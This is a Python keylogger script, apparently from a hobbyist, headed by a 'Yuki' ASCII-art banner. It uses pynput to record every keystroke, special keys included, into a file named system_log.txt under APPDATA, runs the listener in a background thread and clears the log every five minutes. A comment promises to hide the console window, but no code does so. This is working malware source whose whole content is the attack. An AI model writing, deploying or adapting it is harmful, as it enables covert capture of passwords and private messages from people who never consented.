import os
import time
from pynput import keyboard
from pynput.keyboard import Key, Listener
import threading

# Hide the console window (Windows only)
import ctypes

# Define the log file path
log_file = os.environ.get('APPDATA') + '\\system_log.txt'

# ASCII Art UI for "Yuki" in Fraktur font, colored blue
def print_ui():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[34m")  # Set text color to blue
    print(r"""
                                    ..         .    
  ..                        < .z@8"`        @88>  
 @L             x.    .      !@88E          %8P   
9888i   .dL   .@88k  z88u    '888E   u       .    
`Y888k:*888. ~"8888 ^8888     888E u@8NL   .@88u  
  888E  888I   8888  888R     888E`"88*"  ''888E` 
  888E  888I   8888  888R     888E .dN.     888E  
  888E  888I   8888  888R     888E~8888     888E  
  888E  888I   8888 ,888B .   888E '888&    888E  
 x888N><888'  "8888Y 8888"    888E  9888.   888&  
  "88"  888    `Y"   'YP    '"888*" 4888"   R888" 
        88F                    ""    ""      ""   
       98"                                        
     ./"                                          
    ~`                                            
    """)
    print("\033[0m")  # Reset text color
    print("Keylogger is running silently...")
    print("Press CTRL+C to exit.\n")

# Function to log the keystrokes
def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{key.char}')
    except AttributeError:
        special_keys = {
            Key.space: ' ',
            Key.enter: '\n',
            Key.tab: '\t',
            Key.backspace: '[BACKSPACE]',
            Key.esc: '[ESC]',
            Key.shift: '[SHIFT]',
            Key.ctrl_l: '[CTRL]',
            Key.alt_l: '[ALT]',
            Key.caps_lock: '[CAPS LOCK]',
        }
        with open(log_file, 'a') as f:
            f.write(special_keys.get(key, f'[{key}]'))

# Function to start the keylogger
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Function to periodically clear the log file (optional)
def clear_log():
    while True:
        time.sleep(300)  # Clear every 5 minutes
        with open(log_file, 'w') as f:
            f.write('')

# Main function
if __name__ == '__main__':
    print_ui()

    # Start the keylogger in a separate thread
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    # Start the periodic log clearing in a separate thread (optional)
    clear_thread = threading.Thread(target=clear_log)
    clear_thread.daemon = True
    clear_thread.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nKeylogger stopped.")

input("Presiona Enter para salir...")
